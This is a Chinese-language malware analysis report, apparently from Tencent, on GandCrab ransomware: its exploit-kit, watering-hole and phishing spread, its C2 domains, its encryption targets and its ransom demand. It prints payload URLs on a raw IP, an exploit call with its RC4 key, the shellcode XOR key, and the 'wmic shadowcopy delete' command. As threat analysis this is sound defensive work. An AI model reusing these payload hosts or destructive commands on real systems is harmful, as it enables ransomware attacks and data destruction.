@@ -1,0 +1,49 @@
+一、概述
+近日，腾讯御见威胁情报中心捕获到新型勒索病毒GrandCrab，该勒索病毒使用了RSA加密算法，文件加密后后缀改为“.GDCB”。
+尽管GrandCrab勒索病毒从加密方式上与之前发现的勒索病毒并没有太大区别，但此次GrandCrab勒索病毒通过挂马攻击、IE浏览器漏洞、水坑攻击和钓鱼邮件攻击等多种方式进行传播，并且不同于以往勒索病毒勒索比特币，而是向受害者勒索价值1200美元的达世币。
+达世币相对于其他数字加密货币更能隐藏用户信息，例如使用比特币时，任何交易都会被写到数据区块链中，这使得每个人都能查询交易，而达世币则隐藏了这些信息，使得黑客更加难以被追踪。
+二、传播渠道分析
+1、挂马传播
+1）首先对挂马页面进行分析，部分代码如下
+2）var s是段Base64加密后的VB代码，会从如下url加载swf
+http://92.53.124.106/?MTIwOTMw&eDIYHrSaciw&KojvGwiUeJTsK=c3Rvcm1lZA==&yynDbn=bG9jYXRlZA==&dfgwdgsd2rfd=VfihULWcgNpyNoJVAwRoa-tihLczRCU1JPU-RGINV9DrcSQR7QL0VT8yrgdecIjzibfqWVT_A&nMgVPvMTUl=YXR0YWNrcw==&sdfsdfdf23r3=wnvQMvXcKRXQFYbDKuXDSKNDKU7WG0aVw4-fhMG3Yp3Nfynz0uzURnL3tASVVFmRrbMdK-YBN&KrmNoHBZob=bWlzc2luZw==&GeHFiaiIjfCahJx=Y2FwaXRhbA==&DvKIdp=dW5rbm93bg==
+3）对swf进行分析后，发现利用了cve-2015-8651漏洞，部分溢出代码如下
+4）shellcode存放在了gogogo类init方法中的_loc2_字符串中
+5）对shellcode进行分析，该shellcode首先会进行解密，解密算法为每字节和0x84进行异或运算
+6）解密后为一段JS代码，会释放运行GrandCrab勒索病毒，部分代码如下
+2、利用浏览器漏洞攻击
+1）此外，也有发现利用IE浏览器漏洞CVE-2015-2419进行传播，主要的利用代码在sdffg5fg()中
+2）sdffg5fg调用参数如下，第一参数为payload url，第二个为RC4密钥
+sdffg5fg("http://92.53.124.106/?MTUxMjgw&vchqgps&dfgwdgsd2rfd=wiU3UcwZmyodbWg5H8_34jESDzxKf056G_h3ZZQ4T-5eWQORp3QvwnLQkdMIhxhOC7GBgkexdUWo&wLzTaVdiccrpg=bWlzc2luZw==&XJpIHn=YXR0YWNrcw==&xowkhgZjndgWt=dW5rbm93bg==&AnPhpUkp=dW5rbm93bg==&GbecZUUekeu=bWlzc2luZw==&vYQRepjpmJc=c3Rvcm1lZA==&sdfsdfdf23r3=xXjQMvWZbRXQCZ3EKv7cT6NDMVHRG0CL2YudmrHXefjaeFWkzrbFTF_3ozKATgSG6_BtdfJUDVe", "yt3wytE0xlZ8DL5m3")
+3）最终会生成上述swf中的shellcode执行
+3、水坑攻击传播
+通过入侵各网站服务器，将网页内容篡改成乱码，进而诱导用户下载运行“字体更新程序”，实则为下载运行GrandCrab勒索病毒。
+4、钓鱼邮件传播
+之前Necurs僵尸网络由于大范围传播Locky勒索病毒被大家熟知，如今发现Necurs也开始传播GrandCrab勒索病毒，同样是通过伪装成单据等文件的方式诱导用户点击运行。
+三、勒索病毒样本分析
+1、采集用户电脑信息，例如：用户名、电脑名、所在域、电脑语言、系统版本、IP地址等信息
+2、会结束一系列内容编辑进程，防止文档文件被编辑中导致被占用无法加密。
+3、生成勒索信息：
+4、以命令行gandcrab.bit a.dnspod.com运行nslookup，向a.dnspod.com域名服务器查询gandcrab.bit，一旦解析到域名，则会链接C2服务器的IP地址。如果无法连接到，则不会加密文件，但是依然会不停的尝试连接。
+gandcrab.bit只是GrandCrab勒索病毒诸多服务器域名中的一个，根据分析还有如下域名，其中不少伪装成了安全社区、安全软件的域名：
+bleepingcomputer.bit
+nomoreransom.bit
+esetnod32.bit
+emsisoft.bit
+5、查找以下进程来检测机器上当前运行的安全软件，并且上报至C2，从进程列表来看并未发现国产杀软，或许是因为中国暂未成为该勒索病毒的攻击对象。
+6、生成密钥。
+7、将采集到的用户电脑信息、密钥信息上传至服务器。
+8、创建线程，开始加密文件。
+9、在磁盘根目录下创建勒索信息文件GDCB-DECRYPT.txt，此外，会将该勒索信息文件添加到启动项里，使得每次开机都会自动打开勒索信息。
+10、遍历文件时，会对文件后缀进行过滤，仅针对如下后缀名的文件进行加密
+1cd, .3dm, .3ds, .3fr, .3g2, .3gp, .3pr, .7z, .7zip, .aac, .ab4, .abd, .acc, .accdb, .accde, .accdr, .accdt, .ach, .acr, .act, .adb, .adp, .ads, .agdl, .ai, .aiff, .ait, .al, .aoi, .apj, .apk, .arw, .ascx, .asf, .asm, .asp, .aspx, .asset, .asx, .atb, .avi, .awg, .back, .backup, .backupdb, .bak, .bank, .bay, .bdb, .bgt, .bik, .bin, .bkp, .blend, .bmp, .bpw, .bsa, .c, .cash, .cdb, .cdf, .cdr, .cdr3, .cdr4, .cdr5, .cdr6, .cdrw, .cdx, .ce1, .ce2, .cer, .cfg, .cfn, .cgm, .cib, .class, .cls, .cmt, .config, .contact, .cpi, .cpp, .cr2, .craw, .crt, .crw, .cry, .cs, .csh, .csl, .css, .csv, .d3dbsp, .dac, .das, .dat, .db, .db_journal, .db3, .dbf, .dbx, .dc2, .dcr, .dcs, .ddd, .ddoc, .ddrw, .dds, .def, .der, .des, .design, .dgc, .dgn, .dit, .djvu, .dng, .doc, .docm, .docx, .dot, .dotm, .dotx, .drf, .drw, .dtd, .dwg, .dxb, .dxf, .dxg, .edb, .eml, .eps, .erbsql, .erf, .exf, .fdb, .ffd, .fff, .fh, .fhd, .fla, .flac, .flb, .flf, .flv, .flvv, .forge, .fpx, .fxg, .gbr, .gho, .gif, .gray, .grey, .groups, .gry, .h, .hbk, .hdd, .hpp, .html, .ibank, .ibd, .ibz, .idx, .iif, .iiq, .incpas, .indd, .info, .info_, .ini, .iwi, .jar, .java, .jnt, .jpe, .jpeg, .jpg, .js, .json, .k2p, .kc2, .kdbx, .kdc, .key, .kpdx, .kwm, .laccdb, .lbf, .lck, .ldf, .lit, .litemod, .litesql, .lock, .log, .ltx, .lua, .m, .m2ts, .m3u, .m4a, .m4p, .m4v, .ma, .mab, .mapimail, .max, .mbx, .md, .mdb, .mdc, .mdf, .mef, .mfw, .mid, .mkv, .mlb, .mmw, .mny, .money, .moneywell, .mos, .mov, .mp3, .mp4, .mpeg, .mpg, .mrw, .msf, .msg, .myd, .nd, .ndd, .ndf, .nef, .nk2, .nop, .nrw, .ns2, .ns3, .ns4, .nsd, .nsf, .nsg, .nsh, .nvram, .nwb, .nx2, .nxl, .nyf, .oab, .obj, .odb, .odc, .odf, .odg, .odm, .odp, .ods, .odt, .ogg, .oil, .omg, .one, .orf, .ost, .otg, .oth, .otp, .ots, .ott, .p12, .p7b, .p7c, .pab, .pages, .pas, .pat, .pbf, .pcd, .pct, .pdb, .pdd, .pdf, .pef, .pem, .pfx, .php, .pif, .pl, .plc, .plus_muhd, .pm!, .pm, .pmi, .pmj, .pml, .pmm, .pmo, .pmr, .pnc, .pnd, .png, .pnx, .pot, .potm, .potx, .ppam, .pps, .ppsm, .ppsx,.ppt, .pptm, .pptx, .prf, .private, .ps, .psafe3, .psd, .pspimage, .pst, .ptx, .pub, .pwm, .py, .qba, .qbb, .qbm, .qbr, .qbw, .qbx, .qby, .qcow, .qcow2, .qed, .qtb, .r3d, .raf, .rar, .rat, .raw, .rdb, .re4, .rm, .rtf, .rvt, .rw2, .rwl, .rwz, .s3db, .safe, .sas7bdat, .sav, .save, .say, .sd0, .sda, .sdb, .sdf, .sh, .sldm, .sldx, .slm, .sql, .sqlite, .sqlite3, .sqlitedb, .sqlite-shm, .sqlite-wal, .sr2, .srb, .srf, .srs, .srt, .srw, .st4, .st5, .st6, .st7, .st8, .stc, .std, .sti, .stl, .stm, .stw, .stx, .svg, .swf, .sxc, .sxd, .sxg, .sxi, .sxm, .sxw, .tax, .tbb, .tbk, .tbn, .tex, .tga, .thm, .tif, .tiff, .tlg, .tlx, .txt, .upk, .usr, .vbox, .vdi, .vhd, .vhdx, .vmdk, .vmsd, .vmx, .vmxf, .vob, .vpd, .vsd, .wab, .wad, .wallet, .war, .wav, .wb2, .wma, .wmf, .wmv, .wpd, .wps, .x11, .x3f, .xis, .xla, .xlam, .xlk, .xlm, .xlr, .xls, .xlsb, .xlsm, .xlsx, .xlt, .xltm, .xltx, .xlw, .xml, .xps, .xxx, .ycbcra, .yuv, .zip
+11、此外，不会加密如下路径下的文件：
+\ProgramData\, \Program Files\, \Tor Browser\, Ransomware, \All Users\, \Local Settings\
+不会加密如下文件名的文件：
+Desktop.ini, autorun.inf, ntuser.dat, iconcache.db, bootsect.bak, boot.ini, ntuser.dat.log, thumbs.db, GDCB-DECRYPT.txt
+12、以命令行shadowcopy delete调用wmic.exe删除卷影服务，使得文档无法恢复。
+13、加密完成后，文件以“.GDCB”作为后缀。
+14、提示勒索信息，根据提示，需要到指定页面上缴纳赎金。
+15、打开所提示的链接，可以看到GrandCrab会向受害者勒索价值1200美元的达世币，不同于以往的勒索病毒勒索比特币。
+四、安全建议
+腾讯电脑管家推出的“文档守护者2.0”，基于管家的安全防御体系，通过对系统引导、边界防御、本地防御、执行保护、改写保护，备份等多个环节的保护构建完整的防御方案，保护用户的文档不被加密勒索。用户可打开电脑管家【工具箱】-【文档】-【文档守护者】，全面保护文档安全，同时保持电脑管家运行状态实时拦截此类勒索病毒的攻击。
